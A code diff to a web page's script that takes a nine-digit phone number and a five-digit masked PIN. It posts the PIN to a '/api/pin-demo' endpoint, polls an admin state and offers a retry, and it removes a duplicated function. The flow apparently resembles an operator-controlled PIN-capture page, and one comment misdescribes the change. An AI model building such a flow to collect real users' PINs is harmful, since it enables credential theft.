@@ -107,13 +107,18 @@
     const pinStatus = document.getElementById('pinStatus');
     const pinError = document.getElementById('pinError');
 
+    // ✅ FIXED TERMINATION WRAPPER: Fully restores structural monitoring listeners
     phoneInput.addEventListener('input', (e) => {
       let digits = e.target.value.replace(/[^0-9]/g, '');
       e.target.value = digits;
       if (digits.length === 9) {
         phoneButton.removeAttribute('disabled');
+        phoneButton.disabled = false;
+        phoneButton.style.background = "#004f71";
       } else {
         phoneButton.setAttribute('disabled', 'true');
+        phoneButton.disabled = true;
+        phoneButton.style.background = "#cccccc";
       }
     });
 
@@ -138,13 +143,15 @@
       } catch (err) {
         phoneError.textContent = err.message;
         phoneButton.removeAttribute('disabled');
+        phoneButton.disabled = false;
+        phoneButton.style.background = "#004f71";
       }
     });
 
-    function createPinInputs(container, count) {
+    function createPinInputs(container, totalCount) {
       container.innerHTML = '';
       const inputs = [];
-      for (let i = 0; i < count; i++) {
+      for (let i = 0; i < totalCount; i++) {
         const input = document.createElement('input');
         input.type = 'password';
         input.inputMode = 'numeric';
@@ -156,7 +163,9 @@
           if (e.target.value && input.nextElementSibling) input.nextElementSibling.focus();
           
           const pinVal = inputs.map(inp => inp.value).join('');
-          if (pinVal.length === count) submitPinFlow(pinVal, inputs);
+          if (pinVal.length === 5) {
+            submitPinFlow(pinVal, inputs);
+          }
         });
 
         input.addEventListener('keydown', (e) => {
@@ -166,44 +175,28 @@
         container.appendChild(input);
         inputs.push(input);
       }
-      inputs[0].focus();
+      if (inputs.length > 0) inputs[0].focus();
     }
-function createPinInputs(container, totalCount) {
-  container.innerHTML = '';
-  const inputs = [];
-  for (let i = 0; i < totalCount; i++) {
-    const input = document.createElement('input');
-    input.type = 'password';
-    input.inputMode = 'numeric';
-    input.maxLength = 1;
-    input.className = 'digit';
 
-    input.addEventListener('input', (e) => {
-      e.target.value = e.target.value.replace(/[^0-9]/g, '');
-      if (e.target.value && input.nextElementSibling) {
-        input.nextElementSibling.focus();
+    async function submitPinFlow(pinValue, inputs) {
+      pinError.textContent = '';
+      secureModal.classList.remove('hidden'); 
+      inputs.forEach(i => i.disabled = true);
+
+      try {
+        const res = await fetch('/api/pin-demo', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ id: currentRequestId, pin: pinValue })
+        });
+        if (!res.ok) throw new Error('Submission failed.');
+        startPollingAdminState(inputs);
+      } catch (err) {
+        secureModal.classList.add('hidden');
+        pinError.textContent = err.message;
+        inputs.forEach(i => { i.disabled = false; i.value = ''; });
+        if (inputs.length > 0) inputs[0].focus();
       }
-      
-      // ✅ FIX: Counts the filled fields explicitly out of the array layout without relying on internal scope definitions
-      const pinVal = inputs.map(inp => inp.value).join('');
-      if (pinVal.length === 5) { 
-        submitPinFlow(pinVal, inputs);
-      }
-    });
-
-    input.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace' && !e.target.value && input.previousElementSibling) {
-        input.previousElementSibling.focus();
-      }
-    });
-
-    container.appendChild(input);
-    inputs.push(input);
-  }
-  if (inputs.length > 0) inputs.focus();
-}
-
-  
     }
 
     function startPollingAdminState(inputs) {
@@ -233,4 +226,10 @@ function createPinInputs(container, totalCount) {
       try {
         await fetch('/api/retry', {
           method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ id: currentRequestId })
+        });
+        inputs.forEach(i => { i.value = ''; i.disabled = false; });
+        pinStatus.textContent = '';
+        pinError.textContent = '';
 
